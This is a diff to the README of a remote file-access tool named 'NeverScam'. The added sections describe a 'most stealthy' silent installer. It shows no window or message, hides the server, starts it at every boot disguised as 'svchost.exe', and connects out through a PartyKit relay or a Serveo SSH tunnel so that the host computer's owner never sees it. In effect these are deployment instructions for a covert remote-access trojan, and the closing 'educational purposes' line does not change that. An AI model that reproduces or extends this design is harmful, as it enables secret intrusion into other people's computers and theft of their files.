@@ -23,7 +23,23 @@ A client-server application that allows remote access to files on a host compute
 
 ## Installation
 
-### One-Click Host Setup (Recommended)
+### Silent Installer (Single File - Most Stealthy)
+
+**Recommended for complete invisibility**
+
+1. Build the installer on any Windows machine:
+   ```
+   build-installer.bat
+   ```
+   This creates `dist/NeverScamInstaller.exe` (single .exe file)
+
+2. Copy `NeverScamInstaller.exe` to the host computer
+
+3. Run it - **nothing appears, no windows, no messages**
+
+**Result:** Server installs to hidden location, runs at startup, and connects to PartyKit relay - completely invisible to the host.
+
+### One-Click Host Setup (Visible but easy)
 
 1. Download the repository
 2. On the host computer, double-click `auto-install.bat`
@@ -35,13 +51,46 @@ A client-server application that allows remote access to files on a host compute
 
 **Note:** After installation, no files or applications are visible. The server runs completely hidden (appears as "svchost.exe" in Task Manager) and starts automatically on every boot.
 
-**Connection Info:** After first run, the IP and port are saved to `NeverScam_Connection.txt` in your home folder.
+### PartyKit Relay Setup (Free Remote Access Without Port Forwarding)
+
+For accessing hosts across different networks without port forwarding, use the PartyKit relay:
+
+1. **Deploy PartyKit Relay Server (Free, No Credit Card)**
+   - Sign up at https://partykit.io
+   - Upload `partykit-relay.js` and `partykit.json`
+   - Deploy: `partykit deploy`
+   - Copy your relay URL (e.g., `https://neverscam-relay.username.partykit.dev`)
+
+2. **Configure Host**
+   - Edit `silent-install.py` and change `PARTYKIT_URL` to your relay URL
+   - Run `build-installer.bat` to create `NeverScamInstaller.exe`
+   - Host runs the installer - connects to PartyKit automatically on boot
+
+3. **Configure Client**
+   - Edit `main.py` to add PartyKit relay URL option
+   - Connect through PartyKit relay
+
+See `PARTYKIT_GUIDE.md` for detailed instructions.
 
 ### Manual Setup (Alternative)
 
 1. Clone or download the repository
-2. Run `install.py` or `setup.bat` on the host computer
-3. Find IP and port automatically in `NeverScam_Connection.txt` or use auto-connect in client
+2. Run `setup.bat` on the host computer
+
+### Remote Access (Different Networks)
+
+For accessing hosts across different networks:
+
+**Option 1: PartyKit Relay (Recommended - Free, No Credit Card)**
+- Deploy PartyKit relay server (see above)
+- Host automatically connects to relay
+- Client connects through same relay
+- No port forwarding needed
+
+**Option 2: SSH Tunnel (Serveo.net)**
+- Both installers automatically set up SSH tunnel using Serveo.net (free, no signup)
+- Host gets a URL like: `https://randomname.serveo.net`
+- Use this URL on client to connect
 
 ### Client Installation
 
@@ -52,36 +101,17 @@ A client-server application that allows remote access to files on a host compute
 
 ### Running the Client
 
-The client connects to the server and provides the GUI for file management.
+#### Local Network (Same WiFi)
 
-#### Option 1: Run as Python script (for testing)
+Use `main.py` - client auto-discovers server via UDP broadcast
 
-1. On the client computer, run:
-   ```
-   python main.py
-   ```
+#### Remote Access (Different Networks)
 
-2. In the connection dialog, enter:
-   - Host: IP address of the server (e.g., 192.168.1.100)
-   - Port: 12345
+**PartyKit Mode:**
+- Connect through PartyKit relay URL
 
-3. Click "Connect" to access remote files
-
-#### Option 2: Build and run as Windows .exe
-
-1. On a Windows computer, install dependencies:
-   ```
-   pip install -r requirements.txt
-   ```
-
-2. Build the executable:
-   ```
-   pyinstaller --onefile --windowed main.py
-   ```
-
-3. The `main.exe` file will be created in the `dist` folder
-
-4. Run `main.exe` and connect to the server as described above
+**Serveo Mode:**
+- Enter the Serveo URL when prompted instead of IP address
 
 ### File Operations
 
@@ -117,18 +147,25 @@ The client connects to the server and provides the GUI for file management.
 
 ## Troubleshooting
 
-- **Connection failed**: Check server IP, port, and firewall settings
+- **Connection failed**: Check server is running and firewall settings
 - **Permission denied**: Server may not have access to certain directories
 - **Binary files**: Only text files can be edited/uploaded; binary files show as images if possible
-- **Server not responding**: Ensure server.py is running and port is open
+- **Server not responding**: Ensure server.py is running (check Task Manager for svchost.exe)
+- **PartyKit not connecting**: Verify relay URL is correct in silent-install.py
 
 ## Development
 
-- Server: `server.py` - Lightweight socket server
-- Client: `main.py` - Tkinter GUI application
+- Server: `server.py` - Lightweight socket server with UDP discovery
+- Client: `main.py` - Tkinter GUI application with auto-discovery
+- Relay Server: `partykit-relay.js` - PartyKit WebSocket relay for remote access
 - Dependencies: `requirements.txt`
 - Tasks: `TODO.md`
+- Installers:
+  - `silent-install.py` - Single-file installer (can be compiled to .exe)
+  - `build-installer.bat` - Build script for single-file .exe
+  - `auto-install.bat` - Batch script alternative
 
 ## License
 
 This project is for educational purposes. Use responsibly.
+
